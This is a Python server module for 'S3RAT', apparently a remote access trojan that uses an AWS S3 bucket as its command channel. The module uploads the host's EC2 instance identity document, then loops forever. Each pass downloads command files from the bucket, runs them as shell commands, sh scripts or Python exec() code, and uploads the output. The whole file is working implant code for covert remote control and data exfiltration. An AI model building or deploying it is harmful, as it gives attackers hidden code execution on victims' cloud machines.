from __future__ import print_function
import logging
import sys
import io
import subprocess
from datetime import datetime
from time import sleep
import urllib3

from . import UTC, get_result_name, S3Comm


log = logging.getLogger(__name__ if __name__ != '__main__' else 'server')

if sys.version_info.major == 2:
    class StringIO(io.StringIO):
        def write(self, s):  # Convert str to unicode for Python 2
            io.StringIO.write(self, s.decode())
else:
    StringIO = io.StringIO


def get_instance_identity():
    http = urllib3.PoolManager()
    try:
        r = http.request('GET', 'http://169.254.169.254/latest/dynamic/instance-identity/document')
        # TODO: Verify using document signature
        return r.data.decode('utf-8')
    except urllib3.exceptions.HTTPError as e:
        log.error("HTTPError getting instance identity: %s", str(e))
        return '{{ "error": "{}" }}'.format(str(e))


def execute_cmd(cmd_text):
    """ Execute a single command and return the result

    :param cmd_text: command text (str)
    :return: stdout and stderr combined text (str)
    """
    try:
        p = subprocess.check_output(cmd_text.split(' '), stderr=subprocess.STDOUT)
        return p.decode('utf-8')
    except Exception as e:
        return repr(e)


def execute_script(script_text, prog='sh'):
    """ Execute a shell script and return the result

    :param script_text: script as text (str)
    :param prog: program to use as shell
    :return: stdout and stderr combined text (str)
    """
    try:
        p = subprocess.check_output(prog, stdin=script_text.encode('utf-8'), stderr=subprocess.STDOUT)
        return p.decode('utf-8')
    except Exception as e:
        return repr(e)


def execute_python(python_script):
    """ Execute a python script and return the result

    :param python_script: string to be executed as Python code
    :return: output generated by execution of Python code (str)
    """
    try:
        output = StringIO()
        sys.stdout = output
        exec(python_script)
        sys.stdout = sys.__stdout__
        return output.getvalue()
    except Exception as e:
        return repr(e)


def cli_setup_parser(subparser):
    cli = subparser.add_parser('server', description="Run to check S3 for commands to execute")
    cli.add_argument('bucket', help="S3 Bucket name to use")
    cli.add_argument('--resume', dest="session",
                     help="Resume an existing session instead of creating a new one")
    cli.set_defaults(func=cli_main)


def cli_main(args):
    print("Starting S3RAT server...")
    comm = S3Comm(args.bucket)
    sid = comm.start_session(args.session)
    print("Session ID:", sid)
    comm.upload("0_server_identity.json", get_instance_identity())
    print("Server is ready")
    while True:
        for new_name in comm.check():
            print("New Command:", new_name)
            obj_body = comm.download(new_name)
            result = None
            if new_name.endswith('cmd'):
                log.info("Execute Command: %s", new_name)
                result = execute_cmd(obj_body)
            elif new_name.endswith('sh'):
                log.info("Execute Script: %s", new_name)
                result = execute_script(obj_body)
            elif new_name.endswith('py'):
                log.info("Execute Python: %s", new_name)
                result = execute_python(obj_body)
            else:
                log.error("Unknown File Type: %s", new_name)
            comm.remember(new_name)
            if result:
                print("Completed:", new_name)
                result_name = get_result_name(new_name)
                comm.upload(result_name, result)
        print(datetime.now(UTC).strftime("%H%M%SZ"), "Sleeping...")
        sleep(5)
